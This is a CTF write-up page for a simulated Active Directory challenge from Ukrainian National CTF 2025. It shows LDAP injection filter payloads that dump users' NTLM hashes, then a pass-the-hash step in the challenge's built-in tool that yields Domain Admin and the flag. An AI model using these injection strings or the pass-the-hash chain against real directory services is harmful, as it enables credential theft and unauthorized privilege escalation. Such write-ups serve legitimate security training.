<!doctype html>
<html lang="en-US">
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Ukrainian National CTF 2025 – Task 9 (LDAP Injection + Pass-the-Hash)</title>
    <meta name="description" content="Writeup for Task 9 (LDAP Injection + Pass-the-Hash) from Ukrainian National CTF 2025 by Alexandru Hossu.">
    <meta property="og:title" content="Task 9 – LDAP Injection + Pass-the-Hash" />
    <meta property="og:locale" content="en_US" />
    <meta property="og:type" content="article" />
    <meta name="twitter:card" content="summary" />
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">

    <link href="https://fonts.googleapis.com/css2?family=Work+Sans:wght@300;400;500;700&display=swap" rel="stylesheet">
    <link rel="icon" type="image/jpeg" href="../avatar.jpg">

    <style>
      :root { --bg:#121212; --fg:#e0e0e0; --accent:#61dafb; --border:#333; --muted:#a0a0a0; }
      * { box-sizing:border-box; }
      body { margin:0; padding:0; background:var(--bg); color:var(--fg); font-family:'Work Sans',sans-serif; line-height:1.6; }
      a { color:var(--accent); text-decoration:none; }
      a:hover { text-decoration:underline; }
      .wrapper { max-width:768px; margin:0 auto; padding:2rem 1rem 3rem; }
      .site-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:3rem; }
      .site-title { font-weight:700; font-size:1.5rem; color:var(--fg); }
      .site-logo { height:48px; width:48px; border-radius:50%; object-fit:cover; }
      .post { max-width:768px; margin:0 auto; }
      .post-header h1 { margin:0 0 0.5rem; font-size:2rem; font-weight:500; }
      .post-subtitle { margin:0 0 0.75rem; opacity:0.8; font-size:1rem; }
      .post-meta { margin:0 0 1.5rem; font-size:0.9rem; color:var(--muted); display:flex; flex-wrap:wrap; gap:0.75rem; }
      .post-tags { display:flex; flex-wrap:wrap; gap:0.4rem; margin-top:0.4rem; }
      .tag { font-size:0.75rem; padding:0.15rem 0.5rem; border-radius:999px; border:1px solid var(--border); background:rgba(255,255,255,0.02); }
      .post-toc { margin:2rem 0; padding:1rem 1.25rem; border-radius:0.75rem; border:1px solid var(--border); background:#181818; }
      .post-toc-title { margin:0 0 0.5rem; font-size:0.95rem; font-weight:500; text-transform:uppercase; letter-spacing:0.06em; opacity:0.8; }
      .post-toc ul { margin:0; padding-left:1.25rem; font-size:0.95rem; }
      .post-toc li { margin:0.1rem 0; }
      section + section { margin-top:2rem; }
      h2 { font-size:1.4rem; margin-bottom:0.5rem; font-weight:500; }
      h3 { font-size:1.15rem; margin-bottom:0.4rem; font-weight:500; }
      p { margin:0 0 0.9rem; }
      ul,ol { padding-left:1.25rem; margin-top:0; margin-bottom:0.9rem; }
      code { font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,"Liberation Mono","Courier New",monospace; font-size:0.9rem; background:rgba(255,255,255,0.04); padding:0.15rem 0.3rem; border-radius:0.25rem; }
      pre { margin:0 0 1.25rem; padding:0.85rem 1rem; background:#0b0b0b; border-radius:0.5rem; border:1px solid #1f1f1f; overflow-x:auto; }
      pre code { background:transparent; padding:0; }
      .note { padding:0.75rem 1rem; border-radius:0.5rem; border:1px solid var(--border); background:#181818; font-size:0.92rem; margin-bottom:1rem; }
      .back-link { margin:0 0 2rem; font-size:0.95rem; }
      .site-footer { border-top:1px solid var(--border); margin-top:3rem; padding-top:1rem; display:flex; justify-content:space-between; align-items:center; }
      .site-footer p { margin:0; font-size:0.9rem; opacity:0.6; }
    </style>
  </head>
  <body>
    <div class="wrapper">
      <header class="site-header">
        <a href="/" class="site-title">Alexandru Hossu</a>
        <img src="../avatar.jpg" alt="Logo" class="site-logo">
      </header>

      <article class="post">
        <p class="back-link">
          ← <a href="index.html">Back to all writeups</a>
        </p>

        <header class="post-header">
          <h1>Ukrainian National CTF 2025 – Task 9 (LDAP Injection + Pass-the-Hash)</h1>
          <p class="post-subtitle">
            Simulated AD environment where LDAP injection leaks NTLM hashes, then a built-in PTH tool
            lets you impersonate Domain Admin and read the flag.
          </p>
          <p class="post-meta">
            <span>Category: Web / AD</span>
            <span>CTF: Ukrainian National CTF 2025</span>
          </p>
          <div class="post-tags">
            <span class="tag">LDAP Injection</span>
            <span class="tag">NTLM</span>
            <span class="tag">Pass-the-Hash</span>
          </div>
        </header>

        <nav class="post-toc">
          <p class="post-toc-title">On this page</p>
          <ul>
            <li><a href="#context">0. Context</a></li>
            <li><a href="#login">1. Login & search</a></li>
            <li><a href="#ldap-i">2. LDAP injection</a></li>
            <li><a href="#hashes">3. Dumping NTLM hashes</a></li>
            <li><a href="#pth">4. Pass-the-Hash to Domain Admin</a></li>
            <li><a href="#smb">5. Accessing ADMIN$ for the flag</a></li>
            <li><a href="#flag">6. Flag</a></li>
          </ul>
        </nav>

        <section id="context">
          <h2>0. Context</h2>
          <p>
            This task simulates a corporate directory on top of an LDAP-like backend. There’s a
            web UI for searching users and a separate “security tools” panel with a Pass-the-Hash tester
            and SMB share viewer.
          </p>
          <p>
            The main chain:
          </p>
          <ol>
            <li>Use LDAP injection in the search feature to enumerate users.</li>
            <li>Extract NTLM hashes, especially for the admin account.</li>
            <li>Use the PTH tool with the admin hash.</li>
            <li>List the ADMIN$ share and read the flag file.</li>
          </ol>
        </section>

        <section id="login">
          <h2>1. Login & search</h2>
          <p>
            The challenge provides credentials for a service account:
          </p>
          <pre><code>ldap_service / LDAP_Service_2024!</code></pre>
          <p>
            After login, you land on a simple “LDAP Directory Search” form which builds an LDAP filter
            under the hood.
          </p>
        </section>

        <section id="ldap-i">
          <h2>2. LDAP injection</h2>
          <p>
            The filter is something like:
          </p>
          <pre><code>(&amp;(objectClass=user)(cn=&lt;input&gt;))</code></pre>
          <p>
            I tested for LDAP injection using wildcards and additional conditions:
          </p>
          <pre><code>*)(uid=*
*)(|(uid=*))
</code></pre>
          <p>
            These payloads caused the server to return multiple entries, which means our input is
            injected directly into the LDAP filter and interpreted, not sanitized.
          </p>
        </section>

        <section id="hashes">
          <h2>3. Dumping NTLM hashes</h2>
          <p>
            With a broad search, the app lists all user objects and includes NTLM hashes in the output:
          </p>
          <pre><code>NTLM Hash:
&lt;LM_HASH&gt;:&lt;NT_HASH&gt;</code></pre>
          <p>
            The important one is the Domain Administrator entry. In the challenge it looked like:
          </p>
          <pre><code>LM: aad3b435b51404eeaad3b435b51404ee
NT: 31d6cfe0d16ae931b73c59d7e0c089c0</code></pre>
          <p>
            This NT hash is the classic value for an empty password, which makes it perfect for a PTH demo.
          </p>
        </section>

        <section id="pth">
          <h2>4. Pass-the-Hash to Domain Admin</h2>
          <p>
            In the “Security Research Tools” section, there is a Pass-the-Hash form. I simply filled it with
            the admin credentials:
          </p>
          <pre><code>Username: admin
LM Hash: aad3b435b51404eeaad3b435b51404ee
NT Hash: 31d6cfe0d16ae931b73c59d7e0c089c0</code></pre>
          <p>
            Submitting this returned a success message:
          </p>
          <pre><code>✓ Pass-the-Hash successful!
Authenticated as: Domain Administrator</code></pre>
        </section>

        <section id="smb">
          <h2>5. Accessing ADMIN$ for the flag</h2>
          <p>
            Once authenticated as Domain Admin inside the simulation, the SMB share browser unlocked.
            Listing the shares shows:
          </p>
          <pre><code>ADMIN$
SYSVOL
NETLOGON</code></pre>
          <p>
            <code>ADMIN$</code> maps to <code>C:\Windows\System32</code>. Browsing this share in the UI,
            there is a <code>flag.txt</code> file containing:
          </p>
          <pre><code>CTF{De_vidvaha_tam_i_shchastia}</code></pre>
        </section>

        <section id="flag">
          <h2>6. Flag</h2>
          <p>Final flag:</p>
          <pre><code>CTF{De_vidvaha_tam_i_shchastia}</code></pre>
        </section>
      </article>

      <footer class="site-footer">
        <p>2025 © Alexandru Hossu</p>
      </footer>
    </div>
  </body>
</html>